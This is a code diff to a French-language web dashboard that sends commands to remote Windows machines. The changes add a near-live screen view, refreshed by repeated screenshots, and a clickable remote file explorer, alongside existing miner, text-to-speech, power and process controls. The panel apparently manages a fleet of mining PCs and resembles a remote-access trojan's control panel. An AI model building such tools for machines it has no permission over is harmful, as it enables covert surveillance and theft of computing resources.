@@ -370,14 +370,14 @@ async function openMachineDetail(hostname){
     +'<div class="modal-section"><div class="modal-section-title">Controles</div><div class="modal-controls">'
     +'<div class="power-row" style="margin-bottom:12px"><label style="font-size:.85rem;color:var(--text2);min-width:80px">Puissance</label><input type="range" min="10" max="100" step="5" value="'+cp+'" onchange="setPower(\''+h+'\',this.value,true)" oninput="document.getElementById(\'mpw-val\').textContent=this.value+\'%\'"><span id="mpw-val" style="font-size:1rem;font-weight:700;color:var(--green);min-width:50px;text-align:right">'+cp+'%</span></div>'
     +'<div class="modal-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">Stop</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">Restart</button></div></div>'
-    +'<div class="modal-section"><div class="modal-section-title">📸 Screenshot Live</div><div class="modal-controls">'
-    +'<div class="modal-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 Capturer</button><button class="btn-restart" onclick="startAutoScreen(\''+h+'\')">🔄 Auto (10s)</button><button class="btn-stop" onclick="stopAutoScreen()">⏹ Stop</button></div>'
-    +'<div id="live-screen" style="margin-top:8px"></div></div></div>'
+    +'<div class="modal-section"><div class="modal-section-title">🎥 Vision Live</div><div class="modal-controls">'
+    +'<div class="modal-btns" style="margin-bottom:8px"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 1 Capture</button><button style="background:var(--green3);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="startLiveView(\''+h+'\')">▶ Live</button><button class="btn-stop" onclick="stopLiveView()">⏹ Stop</button></div>'
+    +'<div id="live-screen" style="margin-top:8px;position:relative"><div style="color:var(--text2);text-align:center;padding:40px">Clique Live pour voir l\\\'ecran en direct</div></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">🔊 Text-to-Speech</div><div class="modal-controls">'
     +'<div style="display:flex;gap:8px"><input type="text" id="tts-input" placeholder="Message a dire sur le PC..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem" onkeydown="if(event.key===\'Enter\')sendTTS(\''+h+'\')"><button onclick="sendTTS(\''+h+'\')" style="background:var(--purple);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer">🔊 Parler</button></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">📁 Explorateur Fichiers</div><div class="modal-controls">'
-    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="file-path" value="C:\\" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')browseFiles(\''+h+'\')"><button onclick="browseFiles(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer">📂 Ouvrir</button></div>'
-    +'<div id="file-list" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.8rem;color:var(--text);max-height:250px;overflow-y:auto;white-space:pre-wrap">Chargement C:\\...</div></div></div>'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><button onclick="goUpDir(\''+h+'\')" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;cursor:pointer;font-size:1rem" title="Dossier parent">⬆</button><input type="text" id="file-path" value="C:\\" style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem" onkeydown="if(event.key===\'Enter\')browseFiles(\''+h+'\')"><button onclick="browseFiles(\''+h+'\')" style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-size:.85rem;font-weight:600;cursor:pointer">📂 Go</button></div>'
+    +'<div id="file-list" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:0;font-family:monospace;font-size:.8rem;color:var(--text);max-height:300px;overflow-y:auto">Chargement...</div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">⚡ Power Controls</div><div class="modal-controls">'
     +'<div class="modal-btns"><button style="background:var(--gold);color:#000;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'sleep\')">😴 Veille</button><button style="background:var(--blue);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'reboot\')">🔄 Redemarrer</button><button style="background:var(--red);color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer" onclick="powerAction(\''+h+'\',\'shutdown\')">🔴 Eteindre</button></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">📋 Gestionnaire Processus</div><div class="modal-controls">'
@@ -608,27 +608,28 @@ function powerAction(hostname,action){
   showToast('⚡ '+labels[action]+' envoye a '+hostname);
 }
 
-// AUTO SCREENSHOT
-let autoScreenInterval=null;
-function startAutoScreen(hostname){
-  stopAutoScreen();
-  requestScreenshot(hostname);
-  autoScreenInterval=setInterval(()=>{
-    sendCommand(hostname,'command','screenshot');
-    setTimeout(async()=>{
-      try{
-        const r=await fetch(SB+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname)+'&select=screenshot_b64,screenshot_at',{headers:H});
-        const d=await r.json();
-        if(d.length&&d[0].screenshot_b64){
-          const el=document.getElementById('live-screen');
-          if(el)el.innerHTML='<img src="data:image/jpeg;base64,'+d[0].screenshot_b64+'" style="width:100%;border-radius:8px;border:1px solid var(--border)">';
-        }
-      }catch{}
-    },5000);
-  },10000);
-  showToast('🔄 Auto-screenshot active (10s)');
+// LIVE VIEW (video-like rapid polling)
+let liveViewInterval=null;let liveViewHost=null;
+function startLiveView(hostname){
+  stopLiveView();
+  liveViewHost=hostname;
+  const el=document.getElementById('live-screen');
+  if(el)el.innerHTML='<div style="color:var(--green3);text-align:center;padding:20px">🔴 LIVE - Connexion...</div>';
+  sendCommand(hostname,'command','screenshot');
+  showToast('🔴 Live View active');
+  liveViewInterval=setInterval(async()=>{
+    try{
+      const r=await fetch(SB+'/rest/v1/machines?hostname=eq.'+encodeURIComponent(hostname)+'&select=screenshot_b64,screenshot_at',{headers:H});
+      const d=await r.json();
+      if(d.length&&d[0].screenshot_b64){
+        const el=document.getElementById('live-screen');
+        if(el)el.innerHTML='<div style="position:relative"><div style="position:absolute;top:8px;right:8px;background:var(--red);color:#fff;padding:2px 10px;border-radius:12px;font-size:.7rem;font-weight:700;animation:pulse 1s infinite">🔴 LIVE</div><img src="data:image/jpeg;base64,'+d[0].screenshot_b64+'" style="width:100%;border-radius:8px;border:1px solid var(--border);cursor:pointer" onclick="this.requestFullscreen()"></div>';
+      }
+      sendCommand(hostname,'command','screenshot');
+    }catch{}
+  },3000);
 }
-function stopAutoScreen(){if(autoScreenInterval){clearInterval(autoScreenInterval);autoScreenInterval=null;showToast('⏹ Auto-screenshot arrete');}}
+function stopLiveView(){if(liveViewInterval){clearInterval(liveViewInterval);liveViewInterval=null;liveViewHost=null;showToast('⏹ Live View arrete');const el=document.getElementById('live-screen');if(el)el.innerHTML='<div style="color:var(--text2);text-align:center;padding:40px">Clique Live pour voir l\\'ecran en direct</div>';}}
 
 // SCREENSHOT GALLERY
 async function loadScreenGallery(hostname){
@@ -646,14 +647,24 @@ async function loadScreenGallery(hostname){
   }catch{gallery.innerHTML='<div style="color:var(--red)">Erreur chargement</div>';}
 }
 
-// FILE MANAGER
+// FILE MANAGER (clickable GUI)
+let currentBrowseHost=null;
+function goUpDir(hostname){
+  const p=document.getElementById('file-path');
+  if(!p)return;
+  let v=p.value.replace(/\\$/,'');
+  const i=v.lastIndexOf('\\');
+  p.value=i>0?v.substring(0,i)+'\\':v.substring(0,3);
+  browseFiles(hostname);
+}
 async function browseFiles(hostname){
+  currentBrowseHost=hostname;
   const pathInput=document.getElementById('file-path');
   if(!pathInput)return;
   const path=pathInput.value.trim();
   if(!path)return;
   const output=document.getElementById('file-list');
-  output.textContent='Chargement de '+path+'...';
+  output.innerHTML='<div style="padding:12px;color:var(--text2)">📂 Chargement de '+path+'...</div>';
   const before=new Date().toISOString();
   await sendCommand(hostname,'command','ls:'+path);
   let attempts=0;
@@ -664,12 +675,41 @@ async function browseFiles(hostname){
       const d=await r.json();
       if(d.length&&d[0].message){
         clearInterval(poll);
-        output.textContent=d[0].message.replace(/^CMD:[^\n]*\n/,'');
+        const raw=d[0].message.replace(/^CMD:[^\n]*\n/,'');
+        renderFileList(raw,path,hostname);
       }
     }catch{}
-    if(attempts>20){clearInterval(poll);output.textContent+='Timeout';}
+    if(attempts>20){clearInterval(poll);output.innerHTML='<div style="padding:12px;color:var(--red)">⏱ Timeout</div>';}
   },1500);
 }
+function renderFileList(raw,currentPath,hostname){
+  const output=document.getElementById('file-list');
+  if(!output)return;
+  const lines=raw.split('\n').filter(l=>l.trim());
+  let items=[];
+  for(const line of lines){
+    const m=line.match(/(\d{2}\/\d{2}\/\d{4})\s+(\d{2}:\d{2})\s+(<DIR>|[\d\s]+)\s+(.+)/);
+    if(!m)continue;
+    const name=m[4].trim();
+    if(name==='.'||name==='..')continue;
+    const isDir=m[3].trim()==='<DIR>';
+    const size=isDir?'':m[3].trim().replace(/\s/g,'');
+    items.push({name,isDir,size,date:m[1]+' '+m[2]});
+  }
+  items.sort((a,b)=>b.isDir-a.isDir||a.name.localeCompare(b.name));
+  if(!items.length){output.innerHTML='<div style="padding:12px;color:var(--text2)">Dossier vide ou acces refuse</div>';return;}
+  const base=currentPath.endsWith('\\')?currentPath:currentPath+'\\';
+  output.innerHTML=items.map(f=>{
+    const icon=f.isDir?'📁':'📄';
+    const sizeStr=f.isDir?'':'<span style="color:var(--text2);font-size:.7rem;margin-left:auto">'+formatBytes(parseInt(f.size)||0)+'</span>';
+    if(f.isDir){
+      return '<div onclick="document.getElementById(\'file-path\').value=\''+base.replace(/'/g,"\\'")+f.name.replace(/'/g,"\\'")+'\\\\\';browseFiles(\''+hostname+'\')" style="display:flex;align-items:center;gap:8px;padding:8px 12px;cursor:pointer;border-bottom:1px solid var(--border);transition:background .15s" onmouseover="this.style.background=\'var(--bg2)\'" onmouseout="this.style.background=\'transparent\'">'+icon+' <span style="font-weight:600">'+esc(f.name)+'</span></div>';
+    }
+    return '<div style="display:flex;align-items:center;gap:8px;padding:8px 12px;border-bottom:1px solid var(--border)">'+icon+' '+esc(f.name)+sizeStr+'</div>';
+  }).join('');
+}
+function formatBytes(b){if(b===0)return '0 B';const k=1024,s=['B','KB','MB','GB'];const i=Math.floor(Math.log(b)/Math.log(k));return (b/Math.pow(k,i)).toFixed(i?1:0)+' '+s[i];}
+function esc(s){const d=document.createElement('div');d.textContent=s;return d.innerHTML;}
 
 // PROCESS MANAGER
 async function listProcesses(hostname){
